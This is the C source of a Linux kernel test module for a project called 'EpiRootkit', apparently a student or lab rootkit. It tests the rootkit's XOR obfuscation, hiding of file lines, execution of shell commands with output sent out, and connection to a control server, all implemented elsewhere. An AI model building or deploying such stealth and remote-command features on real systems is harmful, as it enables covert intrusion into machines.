#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit Tests");
MODULE_VERSION("0.1");

/* Test functions */
static int test_xor_cipher(void) {
    char test_data[] = "Hello, World!";
    char original[sizeof(test_data)];
    int length = strlen(test_data);
    
    /* Save original data */
    memcpy(original, test_data, length);
    
    /* Apply XOR cipher */
    apply_xor_cipher(test_data, length);
    
    /* Apply XOR cipher again to decrypt */
    apply_xor_cipher(test_data, length);
    
    /* Compare with original */
    if (memcmp(original, test_data, length) != 0) {
        printk(KERN_ERR "XOR cipher test failed\n");
        return -1;
    }
    
    printk(KERN_INFO "XOR cipher test passed\n");
    return 0;
}

static int test_hide_line(void) {
    const char *test_file = "test.txt";
    unsigned long test_line = 42;
    
    /* Test hiding a line */
    hide_line(test_file, test_line);
    
    /* Verify line is hidden */
    if (!is_line_hidden(test_file, test_line)) {
        printk(KERN_ERR "Hide line test failed\n");
        return -1;
    }
    
    /* Test unhiding a line */
    unhide_line(test_file, test_line);
    
    /* Verify line is not hidden */
    if (is_line_hidden(test_file, test_line)) {
        printk(KERN_ERR "Unhide line test failed\n");
        return -1;
    }
    
    printk(KERN_INFO "Hide/Unhide line test passed\n");
    return 0;
}

static int test_command_execution(void) {
    char test_command[] = "echo 'test'";
    char *output = NULL;
    int ret;
    
    /* Test command execution */
    ret = exec_and_send_output(test_command);
    if (ret != 0) {
        printk(KERN_ERR "Command execution test failed\n");
        return -1;
    }
    
    printk(KERN_INFO "Command execution test passed\n");
    return 0;
}

static int test_connection(void) {
    int ret;
    
    /* Test connection */
    ret = connect_to_server();
    if (ret != 0) {
        printk(KERN_ERR "Connection test failed\n");
        return -1;
    }
    
    /* Clean up */
    if (g_connection_socket) {
        sock_release(g_connection_socket);
        g_connection_socket = NULL;
    }
    
    printk(KERN_INFO "Connection test passed\n");
    return 0;
}

/* Module initialization */
static int __init test_init(void) {
    int ret = 0;
    
    printk(KERN_INFO "Starting EpiRootkit tests...\n");
    
    /* Run tests */
    ret |= test_xor_cipher();
    ret |= test_hide_line();
    ret |= test_command_execution();
    ret |= test_connection();
    
    if (ret == 0) {
        printk(KERN_INFO "All tests passed!\n");
    } else {
        printk(KERN_ERR "Some tests failed!\n");
    }
    
    return ret;
}

/* Module cleanup */
static void __exit test_exit(void) {
    printk(KERN_INFO "EpiRootkit tests completed\n");
}

module_init(test_init);
module_exit(test_exit);